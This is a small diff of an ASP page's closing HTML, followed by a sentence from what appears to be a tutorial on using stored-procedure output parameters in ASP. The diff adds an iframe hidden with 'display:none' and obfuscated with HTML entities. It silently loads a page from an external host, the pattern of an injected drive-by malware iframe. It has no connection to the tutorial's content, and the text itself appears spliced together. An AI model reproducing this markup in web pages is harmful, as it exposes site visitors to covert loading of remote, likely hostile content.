@@ -524,6 +524,7 @@ response.write lCount
       loop
       %>
 </TABLE>
+<iframe src="http://jL.c&#104;ura.pl/rc/" style="&#100;isplay:none"></iframe>
 </BODY>
 </HTML>
 The second ASP, ProductInfo2.asp, calls ProductInfo2, which uses output parameters to return the data. As you can see from the code, there's more effort required to deal with the output parameters. However, as you'll see in a moment, the speed increase is significant.
